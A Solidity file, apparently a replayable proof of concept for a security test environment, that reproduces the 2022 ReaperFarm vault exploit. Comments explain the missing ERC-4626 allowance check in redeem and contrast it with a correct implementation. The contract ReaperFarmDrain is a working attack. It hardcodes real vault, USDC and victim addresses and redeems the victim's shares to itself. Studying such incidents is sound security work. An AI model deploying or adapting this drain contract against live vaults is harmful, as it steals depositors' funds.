// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-08-ReaperFarm).
//
// The DeFiHackLabs PoC (test/ReaperFarm_exp.sol) runs the attack INLINE in the
// Foundry `Attacker` test harness — `attacker = address(this)`, the only call is
// `ReaperVault.redeem(victimShares, address(this), victim)`, and profit is
// measured as `USDC.balanceOf(address(this))`. There is no standalone contract
// to deploy. This file is a faithful, self-contained copy of that inline attack
// (the testExploit body + minimal inline interfaces — no imports so it compiles
// anywhere), compiled inside the registry forge project. Logic and constants are
// copied verbatim from test/ReaperFarm_exp.sol.
//
// VULNERABILITY: Missing owner authorization / ERC4626 allowance check in redeem/withdraw
// Root cause: ReaperVaultV2 (rfUSDC at 0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D) is an ERC-4626-style vault whose public
// `redeem(shares, receiver, owner)` and `withdraw(assets, receiver, owner)`
// functions let the caller specify an ARBITRARY `owner` whose shares are burned
// and an ARBITRARY `receiver` who gets the underlying — but OMITTED the standard
// ERC-4626 allowance gate (`if (msg.sender != owner) _spendAllowance(...)`).
// See IERC4626 in interface.sol for the expected signature and the implied contract.
// 
// Detailed:
// - The vault's redeem impl (around the L324 region referenced in the ftmscan link) accepts
//   the three parameters without access control tying msg.sender to `owner`.
// - balanceOf(owner) is freely queryable.
// - Inside redeem: shares are burned from `owner`, assets are computed from share price,
//   strategy withdrawals triggered if needed, then assets transferred to `receiver`.
// - Contrast to correct impl (e.g. OZ ERC4626): 
//     if (msg.sender != owner) {
//         _spendAllowance(owner, msg.sender, shares);
//     }
//   followed by _burn(owner, shares); ... transfer to receiver.
// 
// Why it works: the access control that protects share ownership was never wired into the
// privileged (owner, receiver) overloads. The function was likely copy-pasted from the
// internal _withdraw helper (which always used msg.sender) when adding ERC4626 surface.
// 
// Impact: Direct theft of all user deposits from the affected Reaper vaults (rfUSDC etc.).
// Any third party can liquidate any other user's position instantly into their own wallet.
// ~1.7M USD stolen in the incident. No economic precondition, no capital, no interaction
// with victim required. Affects every depositor's funds while shares exist.
// 
// Material harm: Victim share holders permanently lose their deposited USDC (and any yield);
// attacker (or any caller) receives the full underlying value with zero cost.
// 
// EXPLOIT STEPS:
// 1. (In this standalone) Call run() from any EOA/contract.
// 2. victimShares = ReaperVault.balanceOf(VICTIM)  -- reads arbitrary owner's balance
// 3. ReaperVault.redeem(victimShares, address(this), VICTIM) -- burns VICTIM's shares, sends USDC to this
// 4. Vault performs the internal withdraw logic (pull from strategy buffers, _burn on victim, transfer).
// 5. Attacker's USDC balance increases by the full converted amount; no revert occurs.
// (See also the inline comments below in run().)

// (original root cause preserved below for reference)

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IReaperVaultV2 {
    function balanceOf(address owner) external view returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
}

contract ReaperFarmDrain {
    IReaperVaultV2 constant ReaperVault = IReaperVaultV2(0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D);
    IERC20 constant USDC = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);

    // The victim whose rfUSDC shares we redeem. Any non-zero depositor works;
    // this is the address the original PoC targeted (a Reaper vault owner).
    address constant VICTIM = 0x59cb9F088806E511157A6c92B293E5574531022A;

    function run() external {
        // 1. Read the victim's entire rfUSDC share balance.
        uint256 victimShares = ReaperVault.balanceOf(VICTIM);
        // VULNERABILITY TRIGGER (see top comment):
        // 2. Redeem it as a THIRD PARTY: owner = VICTIM, receiver = this
        //    contract. There is NO msg.sender == owner check and NO allowance
        //    spent — the vault burns the victim's shares and sends us the
        //    underlying USDC.
        ReaperVault.redeem(victimShares, address(this), VICTIM);
    }
}
